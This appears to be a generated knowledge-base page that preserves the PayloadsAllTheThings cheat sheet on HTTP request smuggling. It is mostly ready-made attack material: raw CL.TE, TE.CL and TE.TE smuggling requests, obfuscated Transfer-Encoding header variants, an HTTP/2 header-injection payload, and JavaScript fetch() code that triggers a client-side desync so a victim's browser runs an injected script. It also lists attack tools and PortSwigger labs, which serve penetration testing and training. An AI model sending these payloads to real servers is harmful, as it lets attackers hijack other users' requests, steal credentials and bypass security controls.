---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Request Smuggling

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-request-smuggling-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Request Smuggling/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Request Smuggling](../../topics/request-smuggling/request-smuggling.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-request-smuggling-readme |
| name | Request Smuggling |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Request%20Smuggling/README.md |

## Preserved Source Material

````yaml
_body: "# Request Smuggling\n\n> HTTP Request smuggling occurs when multiple \"things\" process a request, but differ on how\
  \ they determine where the request starts/ends. This disagreement can be used to interfere with another user's request/response\
  \ or to bypass security controls. It normally occurs due to prioritising different HTTP headers (Content-Length vs Transfer-Encoding),\
  \ differences in handling malformed headers (eg whether to ignore headers with unexpected whitespace), due to downgrading\
  \ requests from a newer protocol, or due to differences in when a partial request has timed out and should be discarded.\n\
  \n## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n    * [CL.TE Vulnerabilities](#clte-vulnerabilities)\n\
  \    * [TE.CL Vulnerabilities](#tecl-vulnerabilities)\n    * [TE.TE Vulnerabilities](#tete-vulnerabilities)\n    * [HTTP/2\
  \ Request Smuggling](#http2-request-smuggling)\n    * [Client-Side Desync](#client-side-desync)\n* [Labs](#labs)\n* [References](#references)\n\
  \n## Tools\n\n* [bappstore/HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) -\
  \ An extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks\n* [defparam/Smuggler](https://github.com/defparam/smuggler)\
  \ - An HTTP Request Smuggling / Desync testing tool written in Python 3\n* [dhmosfunk/simple-http-smuggler-generator](https://github.com/dhmosfunk/simple-http-smuggler-generator)\
  \ - This tool is developed for burp suite practitioner certificate exam and HTTP Request Smuggling labs.\n\n## Methodology\n\
  \nIf you want to exploit HTTP Requests Smuggling manually you will face some problems especially in TE.CL vulnerability\
  \ you have to calculate the chunk size for the second request(malicious request) as PortSwigger suggests `Manually fixing\
  \ the length fields in request smuggling attacks can be tricky.`.\n\n### CL.TE Vulnerabilities\n\n> The front-end server\
  \ uses the Content-Length header and the back-end server uses the Transfer-Encoding header.\n\n```powershell\nPOST / HTTP/1.1\n\
  Host: vulnerable-website.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED\n```\n\nExample:\n\n```powershell\n\
  POST / HTTP/1.1\nHost: domain.example.com\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length:\
  \ 6\nTransfer-Encoding: chunked\n\n0\n\nG\n```\n\n### TE.CL Vulnerabilities\n\n> The front-end server uses the Transfer-Encoding\
  \ header and the back-end server uses the Content-Length header.\n\n```powershell\nPOST / HTTP/1.1\nHost: vulnerable-website.com\n\
  Content-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0\n```\n\nExample:\n\n```powershell\nPOST / HTTP/1.1\nHost:\
  \ domain.example.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86\n\
  Content-Length: 4\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\n\n\
  5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\nx=1\n0\n\n\n```\n\n:warning:\
  \ To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the \"Update\
  \ Content-Length\" option is unchecked.You need to include the trailing sequence `\\r\\n\\r\\n` following the final 0.\n\
  \n### TE.TE Vulnerabilities\n\n> The front-end and back-end servers both support the Transfer-Encoding header, but one of\
  \ the servers can be induced not to process it by obfuscating the header in some way.\n\n```powershell\nTransfer-Encoding:\
  \ xchunked\nTransfer-Encoding : chunked\nTransfer-Encoding: chunked\nTransfer-Encoding: x\nTransfer-Encoding:[tab]chunked\n\
  [space]Transfer-Encoding: chunked\nX: X[\\n]Transfer-Encoding: chunked\nTransfer-Encoding\n: chunked\n```\n\n## HTTP/2 Request\
  \ Smuggling\n\nHTTP/2 request smuggling can occur if a machine converts your HTTP/2 request to HTTP/1.1, and you can smuggle\
  \ an invalid content-length header, transfer-encoding header or new lines (CRLF) into the translated request. HTTP/2 request\
  \ smuggling can also occur in a GET request, if you can hide an HTTP/1.1 request inside an HTTP/2 header\n\n```ps1\n:method\
  \ GET\n:path /\n:authority www.example.com\nheader ignored\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: www.example.com\n```\n\n\
  ## Client-Side Desync\n\nOn some paths, servers don't expect POST requests, and will treat them as simple GET requests,\
  \ ignoring the payload, eg:\n\n```ps1\nPOST / HTTP/1.1\nHost: www.example.com\nContent-Length: 37\n\nGET / HTTP/1.1\nHost:\
  \ www.example.com\n```\n\ncould be treated as two requests when it should only be one. When the backend server responds\
  \ twice, the frontend server will assume only the first response is related to this request.\n\nTo exploit this, an attacker\
  \ can use JavaScript to trigger their victim to send a POST to the vulnerable site:\n\n```javascript\nfetch('https://www.example.com/',\
  \ {method: 'POST', body: \"GET / HTTP/1.1\\r\\nHost: www.example.com\", mode: 'no-cors', credentials: 'include'} )\n```\n\
  \nThis could be used to:\n\n* get the vulnerable site to store a victim's credentials somewhere the attacker can access\
  \ it\n* get the victim to send an exploit to a site (eg for internal sites the attacker cannot access, or to make it harder\
  \ to attribute the attack)\n* to get the victim to run arbitrary JavaScript as if it were from the site\n\n**Example**:\n\
  \n```javascript\nfetch('https://www.example.com/redirect', {\n    method: 'POST',\n        body: `HEAD /404/ HTTP/1.1\\\
  r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y`,\n        credentials: 'include',\n\
  \        mode: 'cors' // throw an error instead of following redirect\n}).catch(() => {\n        location = 'https://www.example.com/'\n\
  })\n```\n\nThis script tells the victim browser to send a `POST` request to `www.example.com/redirect`. That returns a redirect\
  \ which is blocked by CORS, and causes the browser to execute the catch block, by going to `www.example.com`.\n\n`www.example.com`\
  \ now incorrectly processes the `HEAD` request in the `POST`'s body, instead of the browser's `GET` request, and returns\
  \ 404 not found with a content-length, before replying to the next misinterpreted third (`GET /x?x=<script>...`) request\
  \ and finally the browser's actual `GET` request.\nSince the browser only sent one request, it accepts the response to the\
  \ `HEAD` request as the response to its `GET` request and interprets the third and fourth responses as the body of the response,\
  \ and thus executes the attacker's script.\n\n## Labs\n\n* [PortSwigger - HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)\n\
  * [PortSwigger - HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)\n\
  * [PortSwigger - HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header)\n\
  * [PortSwigger - Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)\n\
  * [PortSwigger - Client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)\n\
  \n## References\n\n* [A Pentester's Guide to HTTP Request Smuggling - Busra Demir - October 16, 2020](https://web.archive.org/web/20260111201639/https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling)\n\
  * [Advanced Request Smuggling - PortSwigger - October 26, 2021](https://web.archive.org/web/20260228102047/https://portswigger.net/web-security/request-smuggling/advanced)\n\
  * [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling - James Kettle (@albinowax) - August 10, 2022](https://web.archive.org/web/20220810190719/https://portswigger.net/research/browser-powered-desync-attacks)\n\
  * [HTTP Desync Attacks: Request Smuggling Reborn - James Kettle (@albinowax) - August 7, 2019](https://web.archive.org/web/20260228152820/https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)\n\
  * [Request Smuggling Tutorial - PortSwigger - September 28, 2019](https://web.archive.org/web/20190821011451/https://portswigger.net/web-security/request-smuggling)"
_relative_path: Request Smuggling/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Request Smuggling/README.md
````
